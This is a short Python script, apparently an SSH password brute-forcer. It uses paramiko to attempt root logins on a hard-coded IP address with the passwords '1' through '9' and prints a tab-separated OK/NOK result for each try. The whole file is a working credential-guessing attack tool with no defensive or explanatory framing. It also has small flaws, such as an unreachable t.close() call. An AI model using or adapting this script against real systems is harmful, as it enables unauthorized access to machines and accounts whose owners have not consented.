import paramiko,socket,sys
def manual_auth(username,password,hostname,port=22):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((hostname,port))
    except Exception as e:
        print('*** Connect failed: ' + str(e))
        sys.exit(1)
    t = paramiko.Transport(sock)
    try:
        t.start_client()
    except paramiko.SSHException:
        print('*** SSH negotiation failed.')
        sys.exit()
    try:
        t.auth_password(username, password)
        if t.is_authenticated():
            return '%s\t%s\t%s\tOK' % (hostname,username,password)
        else:
            return '%s\t%s\t%s\tNOK' % (hostname,username,password)

    except:
        return '%s\t%s\t%s\tNOK' % (hostname,username,password)
    t.close()
for passwd in range(1, 10):
    print(manual_auth('root',str(passwd),'110.1.1.249'))